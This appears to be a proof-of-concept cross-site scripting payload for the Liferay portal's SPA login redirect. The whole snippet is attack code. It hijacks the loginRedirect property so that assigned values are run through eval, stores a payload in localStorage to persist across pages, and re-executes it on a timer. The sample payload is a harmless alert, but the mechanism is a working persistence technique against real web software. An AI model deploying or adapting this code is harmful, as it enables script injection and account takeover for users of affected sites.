// Hook into the loginRedirect assignment and auto-execute
Object.defineProperty(Liferay.SPA, 'loginRedirect', {
  set: function(v) {
    console.log('[XSS] loginRedirect set with:', v);
    try {
      eval(v);
    } catch (e) {
      console.error('[XSS Eval Error]', e);
    }
  },
  get: function() {
    return localStorage.getItem('xss_redirect') || '';
  }
});

// Store actual payload in localStorage for re-use across pages
localStorage.setItem('xss_redirect', `alert("🔥 XSS triggered after login!")`);

// Trigger the stored payload after page load (in case it didn’t fire)
setTimeout(() => {
  try {
    const stored = localStorage.getItem('xss_redirect');
    if (stored) eval(stored);
  } catch (e) {
    console.error('[Fallback XSS Eval Error]', e);
  }
}, 2000);
